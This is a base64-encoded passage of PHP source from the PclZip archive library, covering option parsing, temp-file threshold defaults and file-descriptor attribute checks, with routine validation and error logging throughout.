bGUoJHRoaXMtPnppcG5hbWUpKSB7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9NSVNTSU5HX0ZJTEUsICJNaXNzaW5nIGFyY2hpdmUgZmlsZSAnIi4kdGhpcy0+emlwbmFtZS4iJyIpOw0KICAgIHJldHVybihmYWxzZSk7DQogIH0NCg0KICBpZiAoIWlzX3JlYWRhYmxlKCR0aGlzLT56aXBuYW1lKSkgew0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwsICJVbmFibGUgdG8gcmVhZCBhcmNoaXZlICciLiR0aGlzLT56aXBuYW1lLiInIik7DQogICAgcmV0dXJuKGZhbHNlKTsNCiAgfQ0KDQoNCg0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZQYXJzZU9wdGlvbnMoJiRwX29wdGlvbnNfbGlzdCwgJHBfc2l6ZSwgJiR2X3Jlc3VsdF9saXN0LCAkdl9yZXF1ZXN0ZWRfb3B0aW9ucz1mYWxzZSkNCnsNCiAgJHZfcmVzdWx0PTE7DQogIA0KICAkaT0wOw0KICB3aGlsZSAoJGk8JHBfc2l6ZSkgew0KDQogICAgaWYgKCFpc3NldCgkdl9yZXF1ZXN0ZWRfb3B0aW9uc1skcF9vcHRpb25zX2xpc3RbJGldXSkpIHsNCiAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9QQVJBTUVURVIsICJJbnZhbGlkIG9wdGlvbmFsIHBhcmFtZXRlciAnIi4kcF9vcHRpb25zX2xpc3RbJGldLiInIGZvciB0aGlzIG1ldGhvZCIpOw0KDQogICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICB9DQoNCiAgICBzd2l0Y2ggKCRwX29wdGlvbnNfbGlzdFskaV0pIHsNCiAgICAgIGNhc2UgUENMWklQX09QVF9QQVRIIDoNCiAgICAgIGNhc2UgUENMWklQX09QVF9SRU1PVkVfUEFUSCA6DQogICAgICBjYXNlIFBDTFpJUF9PUFRfQUREX1BBVEggOg0KICAgICAgICBpZiAoKCRpKzEpID49ICRwX3NpemUpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX01JU1NJTkdfT1BUSU9OX1ZBTFVFLCAiTWlzc2luZyBwYXJhbWV0ZXIgdmFsdWUgZm9yIG9wdGlvbiAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKS4iJyIpOw0KDQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgIH0NCg0KICAgICAgICAkdl9yZXN1bHRfbGlzdFskcF9vcHRpb25zX2xpc3RbJGldXSA9IFBjbFppcFV0aWxUcmFuc2xhdGVXaW5QYXRoKCRwX29wdGlvbnNfbGlzdFskaSsxXSwgRkFMU0UpOw0KICAgICAgICAkaSsrOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX09QVF9URU1QX0ZJTEVfVEhSRVNIT0xEIDoNCiAgICAgICAgaWYgKCgkaSsxKSA+PSAkcF9zaXplKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9NSVNTSU5HX09QVElPTl9WQUxVRSwgIk1pc3NpbmcgcGFyYW1ldGVyIHZhbHVlIGZvciBvcHRpb24gJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkuIiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgaWYgKGlzc2V0KCR2X3Jlc3VsdF9saXN0W1BDTFpJUF9PUFRfVEVNUF9GSUxFX09GRl0pKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwgIk9wdGlvbiAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKS4iJyBjYW4gbm90IGJlIHVzZWQgd2l0aCBvcHRpb24gJ1BDTFpJUF9PUFRfVEVNUF9GSUxFX09GRiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgJHZfdmFsdWUgPSAkcF9vcHRpb25zX2xpc3RbJGkrMV07DQogICAgICAgIGlmICgoIWlzX2ludGVnZXIoJHZfdmFsdWUpKSB8fCAoJHZfdmFsdWU8MCkpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfT1BUSU9OX1ZBTFVFLCAiSW50ZWdlciBleHBlY3RlZCBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgIH0NCg0KICAgICAgICAkdl9yZXN1bHRfbGlzdFskcF9vcHRpb25zX2xpc3RbJGldXSA9ICR2X3ZhbHVlKjEwNDg1NzY7DQogICAgICAgICRpKys7DQogICAgICBicmVhazsNCg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX1RFTVBfRklMRV9PTiA6DQogICAgICAgIGlmIChpc3NldCgkdl9yZXN1bHRfbGlzdFtQQ0xaSVBfT1BUX1RFTVBfRklMRV9PRkZdKSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9QQVJBTUVURVIsICJPcHRpb24gJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkuIicgY2FuIG5vdCBiZSB1c2VkIHdpdGggb3B0aW9uICdQQ0xaSVBfT1BUX1RFTVBfRklMRV9PRkYnIik7DQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgICR2X3Jlc3VsdF9saXN0WyRwX29wdGlvbnNfbGlzdFskaV1dID0gdHJ1ZTsNCiAgICAgIGJyZWFrOw0KDQogICAgICBjYXNlIFBDTFpJUF9PUFRfVEVNUF9GSUxFX09GRiA6DQogICAgICAgIGlmIChpc3NldCgkdl9yZXN1bHRfbGlzdFtQQ0xaSVBfT1BUX1RFTVBfRklMRV9PTl0pKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwgIk9wdGlvbiAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKS4iJyBjYW4gbm90IGJlIHVzZWQgd2l0aCBvcHRpb24gJ1BDTFpJUF9PUFRfVEVNUF9GSUxFX09OJyIpOw0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQogICAgICAgIGlmIChpc3NldCgkdl9yZXN1bHRfbGlzdFtQQ0xaSVBfT1BUX1RFTVBfRklMRV9USFJFU0hPTERdKSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9QQVJBTUVURVIsICJPcHRpb24gJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkuIicgY2FuIG5vdCBiZSB1c2VkIHdpdGggb3B0aW9uICdQQ0xaSVBfT1BUX1RFTVBfRklMRV9USFJFU0hPTEQnIik7DQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgICR2X3Jlc3VsdF9saXN0WyRwX29wdGlvbnNfbGlzdFskaV1dID0gdHJ1ZTsNCiAgICAgIGJyZWFrOw0KDQogICAgICBjYXNlIFBDTFpJUF9PUFRfRVhUUkFDVF9ESVJfUkVTVFJJQ1RJT04gOg0KICAgICAgICBpZiAoKCRpKzEpID49ICRwX3NpemUpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX01JU1NJTkdfT1BUSU9OX1ZBTFVFLCAiTWlzc2luZyBwYXJhbWV0ZXIgdmFsdWUgZm9yIG9wdGlvbiAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKS4iJyIpOw0KDQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoICAgaXNfc3RyaW5nKCRwX29wdGlvbnNfbGlzdFskaSsxXSkNCiAgICAgICAgICAgICYmICgkcF9vcHRpb25zX2xpc3RbJGkrMV0gIT0gJycpKSB7DQogICAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV0gPSBQY2xaaXBVdGlsVHJhbnNsYXRlV2luUGF0aCgkcF9vcHRpb25zX2xpc3RbJGkrMV0sIEZBTFNFKTsNCiAgICAgICAgICAkaSsrOw0KICAgICAgICB9DQogICAgICAgIGVsc2Ugew0KICAgICAgICB9DQogICAgICBicmVhazsNCg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX0JZX05BTUUgOg0KICAgICAgICBpZiAoKCRpKzEpID49ICRwX3NpemUpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX01JU1NJTkdfT1BUSU9OX1ZBTFVFLCAiTWlzc2luZyBwYXJhbWV0ZXIgdmFsdWUgZm9yIG9wdGlvbiAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKS4iJyIpOw0KDQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoaXNfc3RyaW5nKCRwX29wdGlvbnNfbGlzdFskaSsxXSkpIHsNCiAgICAgICAgICAgICR2X3Jlc3VsdF9saXN0WyRwX29wdGlvbnNfbGlzdFskaV1dWzBdID0gJHBfb3B0aW9uc19saXN0WyRpKzFdOw0KICAgICAgICB9DQogICAgICAgIGVsc2UgaWYgKGlzX2FycmF5KCRwX29wdGlvbnNfbGlzdFskaSsxXSkpIHsNCiAgICAgICAgICAgICR2X3Jlc3VsdF9saXN0WyRwX29wdGlvbnNfbGlzdFskaV1dID0gJHBfb3B0aW9uc19saXN0WyRpKzFdOw0KICAgICAgICB9DQogICAgICAgIGVsc2Ugew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9PUFRJT05fVkFMVUUsICJXcm9uZyBwYXJhbWV0ZXIgdmFsdWUgZm9yIG9wdGlvbiAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKS4iJyIpOw0KDQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgIH0NCiAgICAgICAgJGkrKzsNCiAgICAgIGJyZWFrOw0KDQogICAgICBjYXNlIFBDTFpJUF9PUFRfQllfRVJFRyA6DQogICAgICAgICRwX29wdGlvbnNfbGlzdFskaV0gPSBQQ0xaSVBfT1BUX0JZX1BSRUc7DQogICAgICBjYXNlIFBDTFpJUF9PUFRfQllfUFJFRyA6DQogICAgICAgIGlmICgoJGkrMSkgPj0gJHBfc2l6ZSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfTUlTU0lOR19PUFRJT05fVkFMVUUsICJNaXNzaW5nIHBhcmFtZXRlciB2YWx1ZSBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmIChpc19zdHJpbmcoJHBfb3B0aW9uc19saXN0WyRpKzFdKSkgew0KICAgICAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV0gPSAkcF9vcHRpb25zX2xpc3RbJGkrMV07DQogICAgICAgIH0NCiAgICAgICAgZWxzZSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX09QVElPTl9WQUxVRSwgIldyb25nIHBhcmFtZXRlciB2YWx1ZSBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KICAgICAgICAkaSsrOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX09QVF9DT01NRU5UIDoNCiAgICAgIGNhc2UgUENMWklQX09QVF9BRERfQ09NTUVOVCA6DQogICAgICBjYXNlIFBDTFpJUF9PUFRfUFJFUEVORF9DT01NRU5UIDoNCiAgICAgICAgaWYgKCgkaSsxKSA+PSAkcF9zaXplKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9NSVNTSU5HX09QVElPTl9WQUxVRSwNCgkJICAgICAgICAgICAgICAgICAgICAgIk1pc3NpbmcgcGFyYW1ldGVyIHZhbHVlIGZvciBvcHRpb24gJyINCgkJCQkJCQkgLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pDQoJCQkJCQkJIC4iJyIpOw0KDQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoaXNfc3RyaW5nKCRwX29wdGlvbnNfbGlzdFskaSsxXSkpIHsNCiAgICAgICAgICAgICR2X3Jlc3VsdF9saXN0WyRwX29wdGlvbnNfbGlzdFskaV1dID0gJHBfb3B0aW9uc19saXN0WyRpKzFdOw0KICAgICAgICB9DQogICAgICAgIGVsc2Ugew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9PUFRJT05fVkFMVUUsDQoJCSAgICAgICAgICAgICAgICAgICAgICJXcm9uZyBwYXJhbWV0ZXIgdmFsdWUgZm9yIG9wdGlvbiAnIg0KCQkJCQkJCSAuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkNCgkJCQkJCQkgLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KICAgICAgICAkaSsrOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX09QVF9CWV9JTkRFWCA6DQogICAgICAgIGlmICgoJGkrMSkgPj0gJHBfc2l6ZSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfTUlTU0lOR19PUFRJT05fVkFMVUUsICJNaXNzaW5nIHBhcmFtZXRlciB2YWx1ZSBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICR2X3dvcmtfbGlzdCA9IGFycmF5KCk7DQogICAgICAgIGlmIChpc19zdHJpbmcoJHBfb3B0aW9uc19saXN0WyRpKzFdKSkgew0KDQogICAgICAgICAgICAkcF9vcHRpb25zX2xpc3RbJGkrMV0gPSBzdHJ0cigkcF9vcHRpb25zX2xpc3RbJGkrMV0sICcgJywgJycpOw0KDQogICAgICAgICAgICAkdl93b3JrX2xpc3QgPSBleHBsb2RlKCIsIiwgJHBfb3B0aW9uc19saXN0WyRpKzFdKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIGlmIChpc19pbnRlZ2VyKCRwX29wdGlvbnNfbGlzdFskaSsxXSkpIHsNCiAgICAgICAgICAgICR2X3dvcmtfbGlzdFswXSA9ICRwX29wdGlvbnNfbGlzdFskaSsxXS4nLScuJHBfb3B0aW9uc19saXN0WyRpKzFdOw0KICAgICAgICB9DQogICAgICAgIGVsc2UgaWYgKGlzX2FycmF5KCRwX29wdGlvbnNfbGlzdFskaSsxXSkpIHsNCiAgICAgICAgICAgICR2X3dvcmtfbGlzdCA9ICRwX29wdGlvbnNfbGlzdFskaSsxXTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfT1BUSU9OX1ZBTFVFLCAiVmFsdWUgbXVzdCBiZSBpbnRlZ2VyLCBzdHJpbmcgb3IgYXJyYXkgZm9yIG9wdGlvbiAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKS4iJyIpOw0KDQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgICR2X3NvcnRfZmxhZz1mYWxzZTsNCiAgICAgICAgJHZfc29ydF92YWx1ZT0wOw0KICAgICAgICBmb3IgKCRqPTA7ICRqPHNpemVvZigkdl93b3JrX2xpc3QpOyAkaisrKSB7DQogICAgICAgICAgICAkdl9pdGVtX2xpc3QgPSBleHBsb2RlKCItIiwgJHZfd29ya19saXN0WyRqXSk7DQogICAgICAgICAgICAkdl9zaXplX2l0ZW1fbGlzdCA9IHNpemVvZigkdl9pdGVtX2xpc3QpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmICgkdl9zaXplX2l0ZW1fbGlzdCA9PSAxKSB7DQogICAgICAgICAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV1bJGpdWydzdGFydCddID0gJHZfaXRlbV9saXN0WzBdOw0KICAgICAgICAgICAgICAgICR2X3Jlc3VsdF9saXN0WyRwX29wdGlvbnNfbGlzdFskaV1dWyRqXVsnZW5kJ10gPSAkdl9pdGVtX2xpc3RbMF07DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlaWYgKCR2X3NpemVfaXRlbV9saXN0ID09IDIpIHsNCiAgICAgICAgICAgICAgICAkdl9yZXN1bHRfbGlzdFskcF9vcHRpb25zX2xpc3RbJGldXVskal1bJ3N0YXJ0J10gPSAkdl9pdGVtX2xpc3RbMF07DQogICAgICAgICAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV1bJGpdWydlbmQnXSA9ICR2X2l0ZW1fbGlzdFsxXTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2Ugew0KICAgICAgICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9PUFRJT05fVkFMVUUsICJUb28gbWFueSB2YWx1ZXMgaW4gaW5kZXggcmFuZ2UgZm9yIG9wdGlvbiAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKS4iJyIpOw0KDQogICAgICAgICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgICAgICB9DQoNCg0KICAgICAgICAgICAgaWYgKCR2X3Jlc3VsdF9saXN0WyRwX29wdGlvbnNfbGlzdFskaV1dWyRqXVsnc3RhcnQnXSA8ICR2X3NvcnRfdmFsdWUpIHsNCiAgICAgICAgICAgICAgICAkdl9zb3J0X2ZsYWc9dHJ1ZTsNCg0KICAgICAgICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9PUFRJT05fVkFMVUUsICJJbnZhbGlkIG9yZGVyIG9mIGluZGV4IHJhbmdlIGZvciBvcHRpb24gJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkuIiciKTsNCg0KICAgICAgICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJHZfc29ydF92YWx1ZSA9ICR2X3Jlc3VsdF9saXN0WyRwX29wdGlvbnNfbGlzdFskaV1dWyRqXVsnc3RhcnQnXTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgaWYgKCR2X3NvcnRfZmxhZykgew0KICAgICAgICB9DQoNCiAgICAgICAgJGkrKzsNCiAgICAgIGJyZWFrOw0KDQogICAgICBjYXNlIFBDTFpJUF9PUFRfUkVNT1ZFX0FMTF9QQVRIIDoNCiAgICAgIGNhc2UgUENMWklQX09QVF9FWFRSQUNUX0FTX1NUUklORyA6DQogICAgICBjYXNlIFBDTFpJUF9PUFRfTk9fQ09NUFJFU1NJT04gOg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX0VYVFJBQ1RfSU5fT1VUUFVUIDoNCiAgICAgIGNhc2UgUENMWklQX09QVF9SRVBMQUNFX05FV0VSIDoNCiAgICAgIGNhc2UgUENMWklQX09QVF9TVE9QX09OX0VSUk9SIDoNCiAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV0gPSB0cnVlOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX09QVF9TRVRfQ0hNT0QgOg0KICAgICAgICBpZiAoKCRpKzEpID49ICRwX3NpemUpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX01JU1NJTkdfT1BUSU9OX1ZBTFVFLCAiTWlzc2luZyBwYXJhbWV0ZXIgdmFsdWUgZm9yIG9wdGlvbiAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKS4iJyIpOw0KDQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgIH0NCg0KICAgICAgICAkdl9yZXN1bHRfbGlzdFskcF9vcHRpb25zX2xpc3RbJGldXSA9ICRwX29wdGlvbnNfbGlzdFskaSsxXTsNCiAgICAgICAgJGkrKzsNCiAgICAgIGJyZWFrOw0KDQogICAgICBjYXNlIFBDTFpJUF9DQl9QUkVfRVhUUkFDVCA6DQogICAgICBjYXNlIFBDTFpJUF9DQl9QT1NUX0VYVFJBQ1QgOg0KICAgICAgY2FzZSBQQ0xaSVBfQ0JfUFJFX0FERCA6DQogICAgICBjYXNlIFBDTFpJUF9DQl9QT1NUX0FERCA6DQogICAgICAgIGlmICgoJGkrMSkgPj0gJHBfc2l6ZSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfTUlTU0lOR19PUFRJT05fVkFMVUUsICJNaXNzaW5nIHBhcmFtZXRlciB2YWx1ZSBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICR2X2Z1bmN0aW9uX25hbWUgPSAkcF9vcHRpb25zX2xpc3RbJGkrMV07DQoNCiAgICAgICAgaWYgKCFmdW5jdGlvbl9leGlzdHMoJHZfZnVuY3Rpb25fbmFtZSkpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfT1BUSU9OX1ZBTFVFLCAiRnVuY3Rpb24gJyIuJHZfZnVuY3Rpb25fbmFtZS4iKCknIGlzIG5vdCBhbiBleGlzdGluZyBmdW5jdGlvbiBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICR2X3Jlc3VsdF9saXN0WyRwX29wdGlvbnNfbGlzdFskaV1dID0gJHZfZnVuY3Rpb25fbmFtZTsNCiAgICAgICAgJGkrKzsNCiAgICAgIGJyZWFrOw0KDQogICAgICBkZWZhdWx0IDoNCiAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwNCgkgICAgICAgICAgICAgICAgICAgICAgICJVbmtub3duIHBhcmFtZXRlciAnIg0KCQkJCQkJICAgLiRwX29wdGlvbnNfbGlzdFskaV0uIiciKTsNCg0KICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICB9DQoNCiAgICAkaSsrOw0KICB9DQoNCiAgaWYgKCR2X3JlcXVlc3RlZF9vcHRpb25zICE9PSBmYWxzZSkgew0KICAgIGZvciAoJGtleT1yZXNldCgkdl9yZXF1ZXN0ZWRfb3B0aW9ucyk7ICRrZXk9a2V5KCR2X3JlcXVlc3RlZF9vcHRpb25zKTsgJGtleT1uZXh0KCR2X3JlcXVlc3RlZF9vcHRpb25zKSkgew0KICAgICAgaWYgKCR2X3JlcXVlc3RlZF9vcHRpb25zWyRrZXldID09ICdtYW5kYXRvcnknKSB7DQogICAgICAgIGlmICghaXNzZXQoJHZfcmVzdWx0X2xpc3RbJGtleV0pKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwgIk1pc3NpbmcgbWFuZGF0b3J5IHBhcmFtZXRlciAiLlBjbFppcFV0aWxPcHRpb25UZXh0KCRrZXkpLiIoIi4ka2V5LiIpIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIH0NCiAgfQ0KICANCiAgaWYgKCFpc3NldCgkdl9yZXN1bHRfbGlzdFtQQ0xaSVBfT1BUX1RFTVBfRklMRV9USFJFU0hPTERdKSkgew0KICAgIA0KICB9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdk9wdGlvbkRlZmF1bHRUaHJlc2hvbGQoJiRwX29wdGlvbnMpDQp7DQogICR2X3Jlc3VsdD0xOw0KICANCiAgaWYgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9URU1QX0ZJTEVfVEhSRVNIT0xEXSkNCiAgICAgIHx8IGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9URU1QX0ZJTEVfT0ZGXSkpIHsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQogIA0KICAkdl9tZW1vcnlfbGltaXQgPSBpbmlfZ2V0KCdtZW1vcnlfbGltaXQnKTsNCiAgJHZfbWVtb3J5X2xpbWl0ID0gdHJpbSgkdl9tZW1vcnlfbGltaXQpOw0KICAkbGFzdCA9IHN0cnRvbG93ZXIoc3Vic3RyKCR2X21lbW9yeV9saW1pdCwgLTEpKTsNCg0KICBpZigkbGFzdCA9PSAnZycpDQogICAgICAkdl9tZW1vcnlfbGltaXQgPSAkdl9tZW1vcnlfbGltaXQqMTA3Mzc0MTgyNDsNCiAgaWYoJGxhc3QgPT0gJ20nKQ0KICAgICAgJHZfbWVtb3J5X2xpbWl0ID0gJHZfbWVtb3J5X2xpbWl0KjEwNDg1NzY7DQogIGlmKCRsYXN0ID09ICdrJykNCiAgICAgICR2X21lbW9yeV9saW1pdCA9ICR2X21lbW9yeV9saW1pdCoxMDI0Ow0KICAgICAgICAgIA0KICAkcF9vcHRpb25zW1BDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRF0gPSBmbG9vcigkdl9tZW1vcnlfbGltaXQqUENMWklQX1RFTVBPUkFSWV9GSUxFX1JBVElPKTsNCiAgDQoNCiAgaWYgKCRwX29wdGlvbnNbUENMWklQX09QVF9URU1QX0ZJTEVfVEhSRVNIT0xEXSA8IDEwNDg1NzYpIHsNCiAgICB1bnNldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRF0pOw0KICB9DQogICAgICAgIA0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2RmlsZURlc2NyUGFyc2VBdHQoJiRwX2ZpbGVfbGlzdCwgJiRwX2ZpbGVkZXNjciwgJHZfb3B0aW9ucywgJHZfcmVxdWVzdGVkX29wdGlvbnM9ZmFsc2UpDQp7DQogICR2X3Jlc3VsdD0xOw0KICANCiAgZm9yZWFjaCAoJHBfZmlsZV9saXN0IGFzICR2X2tleSA9PiAkdl92YWx1ZSkgew0KICANCiAgICBpZiAoIWlzc2V0KCR2X3JlcXVlc3RlZF9vcHRpb25zWyR2X2tleV0pKSB7DQogICAgICBQY2xaaXA6OnByaXZFcnJ